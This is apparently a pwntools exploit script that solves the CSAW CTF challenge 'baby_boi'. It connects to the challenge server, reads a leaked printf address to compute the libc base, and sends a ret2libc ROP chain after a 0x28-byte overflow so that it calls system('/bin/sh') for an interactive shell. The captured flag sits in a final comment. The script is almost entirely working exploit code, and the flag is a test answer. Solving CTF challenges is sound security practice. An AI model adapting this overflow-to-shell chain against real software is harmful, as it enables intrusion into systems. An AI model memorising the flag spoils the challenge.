from pwn import *

context.terminal = ["tmux", "split-w", "-h"]


elf = ELF("./baby_boi")
libc = ELF("./libc-2.27.so")
libc = elf.libc


gdbscript = """
gef

set follow-fork-mode child
b main
b *0x40072e
b execve
# b *0x7ffff7a3302a
"""
# io = gdb.debug(["./baby_boi"], aslr=False, gdbscript=gdbscript)
io = process("./baby_boi")
io = remote("pwn.chal.csaw.io", 1005)

io.readuntil("am: ")
addr_printf = int(io.readline().rstrip(), 16)
addr_libc = addr_printf - libc.symbols["printf"]

print "addr_libc = 0x{:x}".format(addr_libc)

payload = ""
payload += "A" * 0x28
payload += p64(0x0000000000400793)  # pop rdi; ret
payload += p64(addr_libc + next(libc.search("/bin/sh")))
payload += p64(0x000000000040054e)  # ret
payload += p64(addr_libc + libc.symbols["system"])

io.sendline(payload)


io.interactive()


# flag{baby_boi_dodooo_doo_doo_dooo}
